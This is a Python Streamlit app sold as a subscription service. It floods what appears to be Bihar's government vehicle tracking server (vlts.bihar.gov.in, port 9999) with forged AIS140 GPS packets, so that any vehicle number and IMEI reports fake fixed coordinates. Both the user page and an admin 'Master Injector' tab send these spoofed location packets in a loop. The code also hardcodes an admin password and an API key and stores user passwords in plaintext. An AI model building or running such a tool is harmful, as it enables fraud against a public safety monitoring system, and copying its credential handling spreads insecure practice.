import streamlit as st
import socket
import time
import pandas as pd
import threading
from datetime import datetime, timedelta
from supabase import create_client, Client

# --- CONFIG ---
SUPABASE_URL = "https://grdgexcjyrhkoffimsuw.supabase.co"
SUPABASE_KEY = "sb_publishable_48s5EvLGqu_gLXDxmRiqMQ_E34kVKqW"
QR_URL = "https://github.com/amitgaurav6721/amit-gps-cloud/blob/main/WhatsApp-Image-2026-03-30-at-23-26-19.jpg?raw=true"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

st.set_page_config(page_title="Bihar VLTS Pro Max", layout="wide")

# --- SESSION STATE ---
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
    st.session_state.user = None
    st.session_state.role = None
    st.session_state.page = "dashboard"
if 'running' not in st.session_state:
    st.session_state.running = False
if 'admin_running' not in st.session_state:
    st.session_state.admin_running = False

# --- DB FUNCTIONS ---
def check_login(user, pwd):
    if user == "admin" and pwd == "admin77": 
        return {"username": "admin", "role": "admin"}
    res = supabase.table("user_profiles").select("*").eq("username", user).eq("password", pwd).execute()
    if res.data:
        if res.data[0].get('status') == 'inactive':
            st.error("🚫 Your account is deactivated. Contact Admin.")
            return None
        return {"username": res.data[0]['username'], "role": "user", "data": res.data[0]}
    return None

def get_plans():
    res = supabase.table("plan_settings").select("*").execute()
    return res.data

def get_tags():
    # Force add your specific list
    required_tags = [
        "RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "VLT", "GPS", 
        "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "EMR", "HB", "HA", "RT", "OS", "IDL", "PWR"
    ]
    res = supabase.table("custom_tags").select("tag_name").execute()
    existing = [item['tag_name'] for item in res.data]
    
    missing = [t for t in required_tags if t not in existing]
    if missing:
        for t in missing:
            supabase.table("custom_tags").upsert({"tag_name": t}).execute()
        res = supabase.table("custom_tags").select("tag_name").execute()
        return [item['tag_name'] for item in res.data]
    return existing

def add_new_tag(new_tag):
    if new_tag:
        supabase.table("custom_tags").upsert({"tag_name": new_tag.upper().strip()}).execute()

def delete_tag(tag_name):
    supabase.table("custom_tags").delete().eq("tag_name", tag_name).execute()

def get_vehicle_data(v_no):
    res = supabase.table("vehicle_master").select("imei_no").eq("vehicle_no", v_no).execute()
    return res.data[0]['imei_no'] if res.data else ""

# --- PACKET SENDING LOGIC ---
def send_packet_thread(host, port, packet, results_list, show_tag=False):
    try:
        final_to_send = packet + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(final_to_send.encode('ascii'))
        time.sleep(0.2)
        s.close()
        tag_disp = "📡 Syncing..." if not show_tag else packet.split(',')[1]
        results_list.append({"Tag/Signal": tag_disp, "Status": "✅ Accepted", "Time": datetime.now().strftime("%H:%M:%S")})
    except:
        results_list.append({"Tag/Signal": "Error", "Status": "❌ Failed", "Time": datetime.now().strftime("%H:%M:%S")})

# --- PAGES ---
def login_page():
    st.title("🔐 Secure Login")
    u = st.text_input("Username")
    p = st.text_input("Password", type="password")
    if st.button("Login", use_container_width=True):
        user = check_login(u, p)
        if user:
            st.session_state.logged_in = True
            st.session_state.user = user['username']
            st.session_state.role = user['role']
            st.session_state.u_data = user.get('data')
            st.rerun()
        else: st.error("Invalid ID or Password")

def recharge_page():
    cid = st.session_state.u_data.get('cid_id', 0)
    st.title("💳 Recharge Your Plan")
    col_a, col_b = st.columns([1, 2])
    with col_a:
        st.image(QR_URL, caption="Scan to Pay", width=250)
        st.info(f"Your ID: **CID-{1000 + cid}**")
    with col_b:
        st.subheader("Step 1: Scan & Pay")
        st.write("**UPI ID:** amit@upi") 
        st.warning(f"⚠️ Payment note mein **CID-{1000 + cid}** zaroor likhein.")
        st.divider()
        st.subheader("Step 2: Submit Details")
        utr = st.text_input("UTR / Transaction ID", placeholder="12 Digit Number")
        plans = get_plans()
        plan_options = [f"₹{p['amount']} - {p['plan_name']} ({p['days']} Days)" for p in plans]
        amt = st.selectbox("Select Plan", plan_options)
        if st.button("Submit Request", use_container_width=True):
            if utr:
                try:
                    supabase.table("recharge_requests").insert({"username": st.session_state.user, "utr_number": utr, "amount": amt}).execute()
                    st.success("✅ Request Sent!")
                except: st.error("UTR already used.")
    if st.button("⬅️ Back"):
        st.session_state.page = "dashboard"; st.rerun()

def admin_panel():
    st.sidebar.title("Admin Dashboard")
    if st.sidebar.button("Logout"):
        st.session_state.logged_in = False; st.rerun()
    
    all_active = supabase.table("user_profiles").select("count", count="exact").eq("status", "active").execute()
    st.sidebar.metric("Live Active Users", all_active.count)

    menu = st.tabs(["Users Control", "Master Injector", "Recharges", "Plans", "Manage Tags"])
    
    with menu[0]:
        st.subheader("🔍 Search & Control Users")
        search_q = st.text_input("Search User by Name")
        if search_q:
            u_search = supabase.table("user_profiles").select("*").ilike("username", f"%{search_q}%").execute()
            if u_search.data:
                for usr in u_search.data:
                    exp_date = datetime.strptime(usr['expiry_date'], '%Y-%m-%d')
                    d_left = (exp_date - datetime.now()).days + 1
                    status = usr.get('status', 'active')
                    with st.expander(f"👤 {usr['username']} (CID-{1000 + usr['cid_id']})"):
                        c1, c2, c3 = st.columns(3)
                        if c1.button("➕ 1 Month", key=f"e1_{usr['username']}"):
                            new_exp = max(exp_date, datetime.now()) + timedelta(days=28)
                            supabase.table("user_profiles").update({"expiry_date": new_exp.strftime("%Y-%m-%d")}).eq("username", usr['username']).execute()
                            st.rerun()
                        if c2.button("➕ 3 Months", key=f"e3_{usr['username']}"):
                            new_exp = max(exp_date, datetime.now()) + timedelta(days=84)
                            supabase.table("user_profiles").update({"expiry_date": new_exp.strftime("%Y-%m-%d")}).eq("username", usr['username']).execute()
                            st.rerun()
                        new_stat = 'inactive' if status == 'active' else 'active'
                        if c3.button(f"Mark {new_stat.upper()}", key=f"s_{usr['username']}"):
                            supabase.table("user_profiles").update({"status": new_stat}).eq("username", usr['username']).execute()
                            st.rerun()
        
        st.divider()
        st.subheader("➕ Create New User")
        with st.form("new_user"):
            new_u = st.text_input("New User ID")
            new_p = st.text_input("New Password")
            lat = st.number_input("Lat", value=25.5941, format="%.7f")
            lon = st.number_input("Lon", value=85.1376, format="%.7f")
            if st.form_submit_button("Create User"):
                supabase.table("user_profiles").insert({"username": new_u, "password": new_p, "latitude": lat, "longitude": lon, "expiry_date": (datetime.now() + timedelta(days=28)).strftime("%Y-%m-%d"), "status": "active"}).execute()
                st.success("User Created!")

    with menu[1]:
        st.subheader("🚀 Master Injector (Full Control)")
        col1, col2 = st.columns(2)
        with col1:
            adm_v_no = st.text_input("Admin Vehicle No", value="BR01P1234").upper()
            adm_imei = st.text_input("Admin IMEI", value="865432109876543", max_chars=15)
        with col2:
            adm_lat = st.number_input("Admin Latitude", value=25.5941, format="%.7f")
            adm_lon = st.number_input("Admin Longitude", value=85.1376, format="%.7f")
        
        st.divider()
        if not st.session_state.admin_running:
            if st.button("🔥 START MASTER INJECTION", type="primary", use_container_width=True):
                st.session_state.admin_running = True
                st.rerun()
        else:
            if st.button("🛑 STOP MASTER INJECTION", use_container_width=True):
                st.session_state.admin_running = False
                st.rerun()
            
            adm_status = st.empty()
            adm_string = st.empty() # Yahan Raw String dikhegi
            
            while st.session_state.admin_running:
                res = []
                threads = []
                tag_list = get_tags()
                dt = datetime.now().strftime("%d%m%Y,%H%M%S")
                
                # Preview of the very first string being sent
                sample_p = f"$PVT,{tag_list[0]},2.1.1,NR,01,L,{adm_imei},{adm_v_no},1,{dt},{adm_lat:.7f},N,{adm_lon:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
                adm_string.info(f"**Final String Sent:** `{sample_p}`")

                for t in tag_list:
                    p = f"$PVT,{t},2.1.1,NR,01,L,{adm_imei},{adm_v_no},1,{dt},{adm_lat:.7f},N,{adm_lon:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
                    th = threading.Thread(target=send_packet_thread, args=("vlts.bihar.gov.in", 9999, p, res, True))
                    threads.append(th); th.start()
                for th in threads: th.join()
                adm_status.table(pd.DataFrame(res))
                time.sleep(1.0)

    with menu[2]:
        st.subheader("Pending Recharges")
        reqs = supabase.table("recharge_requests").select("*").eq("status", "pending").execute()
        if reqs.data:
            for r in reqs.data:
                col1, col2 = st.columns([3, 1])
                col1.write(f"👤 {r['username']} | {r['amount']} | UTR: {r['utr_number']}")
                if col2.button("Approve", key=f"app_{r['id']}"):
                    try: days_to_add = int(r['amount'].split('(')[1].split(' ')[0])
                    except: days_to_add = 28
                    user_res = supabase.table("user_profiles").select("expiry_date").eq("username", r['username']).execute()
                    current_exp = datetime.strptime(user_res.data[0]['expiry_date'], '%Y-%m-%d')
                    new_exp = max(current_exp, datetime.now()) + timedelta(days=days_to_add)
                    supabase.table("user_profiles").update({"expiry_date": new_exp.strftime("%Y-%m-%d")}).eq("username", r['username']).execute()
                    supabase.table("recharge_requests").update({"status": "approved"}).eq("id", r['id']).execute()
                    st.success("Approved!"); st.rerun()
        else: st.write("No pending requests.")

    with menu[3]:
        st.subheader("💰 Manage Plans")
        for p in get_plans():
            with st.expander(f"Edit {p['plan_name']}"):
                n_amt = st.text_input("Amount", value=p['amount'], key=f"p_amt_{p['id']}")
                n_day = st.number_input("Days", value=p['days'], key=f"p_day_{p['id']}")
                if st.button("Save", key=f"p_btn_{p['id']}"):
                    supabase.table("plan_settings").update({"amount": n_amt, "days": n_day}).eq("id", p['id']).execute()
                    st.success("Updated!"); st.rerun()

    with menu[4]:
        st.subheader("Manage Global Tags")
        tags = get_tags()
        for t in tags:
            c1, c2 = st.columns([4, 1])
            c1.code(t)
            if c2.button("❌", key=f"del_{t}"): delete_tag(t); st.rerun()
        t_add = st.text_input("Add New Tag")
        if st.button("Add Tag"): add_new_tag(t_add); st.rerun()

def user_panel():
    u_data = st.session_state.u_data
    expiry = datetime.strptime(u_data['expiry_date'], '%Y-%m-%d')
    days_left = (expiry - datetime.now()).days + 1
    if st.session_state.page == "recharge":
        recharge_page(); return
    st.sidebar.title(f"👋 Welcome, {st.session_state.user}")
    st.sidebar.info(f"🆔 CID-{1000 + u_data.get('cid_id', 0)}")
    if days_left <= 0:
        st.error("🚫 PLAN EXPIRED."); 
        if st.sidebar.button("💳 Recharge"): st.session_state.page = "recharge"; st.rerun()
        return
    st.sidebar.success(f"📅 {days_left} Days Left")
    if days_left <= 5:
        st.warning(f"🔔 Plan expires in {days_left} days."); 
        if st.button("💳 Recharge Now", use_container_width=True): st.session_state.page = "recharge"; st.rerun()
    if st.sidebar.button("Logout"): st.session_state.logged_in = False; st.rerun()

    col1, col2 = st.columns([2, 1])
    with col1:
        v_no = st.text_input("Vehicle No").upper()
        imei = st.text_input("IMEI", value=get_vehicle_data(v_no) if v_no else "", max_chars=15)
        with st.expander("🛠️ Settings"):
            st.write("Agar tool kaam na kare toh please tag add karein...")
            t_in = st.text_input("Tag Code", type="password")
            if st.button("Update"): add_new_tag(t_in); st.success("Updated!")
    with col2: st.map(pd.DataFrame({'lat': [u_data['latitude']], 'lon': [u_data['longitude']]}))

    st.divider()
    if not st.session_state.running:
        if st.button("🚀 START", type="primary", use_container_width=True):
            if v_no and imei:
                st.session_state.running = True
                supabase.table("vehicle_master").upsert({"vehicle_no": v_no, "imei_no": imei}).execute()
                st.rerun()
    else:
        st.success(f"🟢 {v_no} Running..."); 
        if st.button("🛑 STOP", use_container_width=True): st.session_state.running = False; st.rerun()
        status_area = st.empty()
        while st.session_state.running:
            res = []
            threads = []
            tag_list = get_tags()
            for t in tag_list:
                p = f"$PVT,{t},2.1.1,NR,01,L,{imei},{v_no},1,{datetime.now().strftime('%d%m%Y,%H%M%S')},{u_data['latitude']:.7f},N,{u_data['longitude']:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
                th = threading.Thread(target=send_packet_thread, args=("vlts.bihar.gov.in", 9999, p, res))
                threads.append(th); th.start()
            for th in threads: th.join()
            status_area.table(pd.DataFrame(res)); time.sleep(1.0)

if not st.session_state.logged_in: login_page()
elif st.session_state.role == 'admin': admin_panel()
else: user_panel()
